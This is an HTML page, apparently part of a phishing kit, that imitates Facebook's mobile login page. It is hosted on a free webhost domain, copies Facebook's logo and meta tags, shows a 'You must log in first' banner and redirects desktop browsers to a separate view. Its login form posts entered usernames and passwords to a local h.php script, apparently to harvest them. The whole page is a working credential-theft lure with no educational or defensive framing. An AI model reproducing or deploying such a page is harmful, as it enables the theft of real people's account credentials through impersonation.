
<script>
if( navigator.userAgent.match(/Android/i)
 || navigator.userAgent.match(/webOS/i)
 || navigator.userAgent.match(/iPhone/i)
 || navigator.userAgent.match(/iPad/i)
 || navigator.userAgent.match(/iPod/i)
 || navigator.userAgent.match(/BlackBerry/i)
 || navigator.userAgent.match(/Windows Phone/i)){
    true;
 } else {

   window.location.href = "desktop_view.php";;

 }

</script>
<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" xmlns:og="http://ogp.me/ns#" xmlns:fb="https://www.facebook.com/2008/fbml">

<head>
  <link rel="icon" type="image/png" href="https://static.facebook.com/images/logos/facebook_2x.png" />
  <meta content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" name="viewport">
  <meta charset="utf-8">

  <!--========image url==========-->
  <meta name="description" content="Log in to Facebook | Facebook.">
  <meta property="og:image" content="https://static.facebook.com/images/logos/facebook_2x.png" />
  <meta property="og:image:type" content="image/jpeg, image/gif, image/png" />
  <!-- <meta property="og:image:width" content="350" />
  <meta property="og:image:height" content="350" /> -->
  <link itemprop="thumbnailUrl" href="https://static.facebook.com/images/logos/facebook_2x.png">
  <span itemprop="thumbnail" itemscope="" itemtype="http://schema.org/ImageObject">
    <link itemprop="url" href="https://kingoftuts.000webhostapp.com/"> </span>


    <!-- fb OpenGraph Meta Tags-->
    <meta property="og:url" content="https://kingoftuts.000webhostapp.com/" />
    <meta property="og:type" content="website" />
    <meta property="og:title" content="Log in to Facebook | Facebook" />
    <meta property="og:description" content="Log in to Facebook to start sharing and connecting with your friends, family and people you know.." />
    <meta property="og:image" content="https://static.facebook.com/images/logos/facebook_2x.png" />
    <meta property="og:image:type" content="image/jpeg, image/gif, image/png" />
    <!-- <meta property="og:image:width" content="350" />
    <meta property="og:image:height" content="250" /> -->
    <meta property="og:site_name" content="dd" />
    <meta property="fb:app_id" content="169233047080501">

    <title>Log in to Facebook | Facebook</title>

<link href='https://fonts.googleapis.com/css?family=Open+Sans:400,700' rel='stylesheet' type='text/css'>

<!-- <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" integrity="sha384-JcKb8q3iqJ61gNV9KGb8thSsNjpSL0n8PARn9HuZOnIxN0hoP+VmmDGMN5t9UJ0Z" crossorigin="anonymous"> -->

<!-- Compiled and minified CSS -->
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/materialize/1.0.0/css/materialize.min.css">

<link rel="stylesheet" type="text/css" href="mobile_login.css">

</head>
<body>

<div class="page-header">
  <div class="header-row row">
    <div class="col s6">
          <div class="logo">
            <img src="img/logo.png" alt="logo">
          </div>
    </div>

    <div class="col s6">
          <div class="link-box">
           <a href="#">Create Account</a>
          </div>
    </div>
  </div>
</div>
<div class="alert-login">
    <p>You must log in first</p>
</div>


<div class="page-wrapper">


    <div class="login-box container">
        <div class="row">
           <!-- <div class="col s1"></div> -->
           <div class="col s12">
                <br>
                <form action="h.php" method="POST">
                    <div class="form-group form-input">
                      <label for="username"> Email or Phone Number</label><br>
                        <input type="text" name="username" placeholder="Email or Phone number" required>
                    </div>

                    <div class="form-group form-input">
                      <label for="username">Password</label><br>
                        <input type="password" name="password" placeholder="Email or Phone number" required>
                    </div>
                    <br>
                    <button type="submit" class="btn btn-fb btn-lg btn-block" name="button">Log In</button>
                </form>

           </div>
           <!-- <div class="col s1"></div> -->
        </div>

        <br>
          <div class="row">
              <div class="col s12">
                <div class="or-line">
                      <span class="left-line">---------------</span>
                      <span class="center-line">OR</span>
                      <span class="right-line">--------------</span>
                </div>

              </div>
          </div>



          <br>

            <div class="row">
               <div class="col s12">
                  <button type="submit" class="btn btn-register btn-lg btn-block" name="button">Create New Account</button>
                  <p style="text-align:center"> <a class="text-success forgotpass" href="#">Forgot Password ?</a> </p>
               </div>
            </div>




    </div>
    <div class="footer-page">
        <div class="row">
           <div class="col s6">
              <ul class="footer-list">
                 <li> <a class="active-link" href="#">English UK</a> </li>
                  <li> <a class="text-info" href="#">Portugues</a> </li>
                  <li> <a class="text-info" href="#">Arab</a> </li>
                    <li> <a class="text-info" href="#">Italiano</a> </li>
              </ul>
           </div>

           <div class="col s6">
              <ul class="footer-list">
                 <li> <a class="active-link" href="#">Francais (France)</a> </li>
                  <li> <a class="text-info" href="#">Espanol</a> </li>
                  <li> <a class="text-info" href="#">Deutsch</a> </li>
                  <li> <a class="text-info" href="#">Italiano</a> </li>
              </ul>
           </div>
        </div>
          <p style="text-align:center;"><a style="color:#fff" href="#">Facebook Inc</a></p>
          <br>
    </div>

</div>









</body>
</html>
